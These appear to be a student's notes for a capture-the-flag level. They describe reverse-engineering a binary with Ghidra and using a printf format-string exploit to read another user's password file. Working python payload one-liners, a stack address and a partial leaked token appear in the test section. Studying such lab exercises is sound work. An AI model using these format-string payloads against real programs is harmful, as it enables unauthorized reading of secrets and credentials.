
/*********************/
/*	Strategy     */
/*********************/

=> use ghidra to reverser engineer baniray and create
=> create a patch on ghidra, modify .pass to level02/.pass
=> test it in /tmp/level02
=> use the patch to determine address of buffer of the first read (line 68) 
found: 0x7fffffffe570

=> try to overwrite this address with format string exploit with the printf (line 98)
padding: 28 addr

=> trying to read value at pass file 
with injecting address and read it like "\x70\xe5\xff\xff\xff\x7f\x00\x00" + %28$s"

=> doesn't work because printf don't print after \x00\x00 of the stack address
-> \x70\xe5\xff\xff\xff\x7f\x00\x00 <- doesn't print after the \x00\x00
=> put print and conversion before then (probleme: address are not correctly aligned 0a...)
=> then add 0 before the num to align on an 8 bytes address


/*************************/
/*	T E S T S	 */
/*************************/

python -c 'print "%00029$s" + "\x70\xe5\xff\xff\xff\x7f\x00\x00\nAAAA"' | ./level02
-> works on my patch in level02/.pass in tmp
-> but give partial token in level03/.pass ??? why lol 
XgNWCqz7sXGnh5J5M9KfPg3Hp���� does not have access!
=> FAIL

-> Try other value in stack because env are different 
python -c 'print "%00029$s" + "\x60\xe5\xff\xff\xff\x7f\x00\x00\nAAAA"' | ./level02 
=> Token in complete 
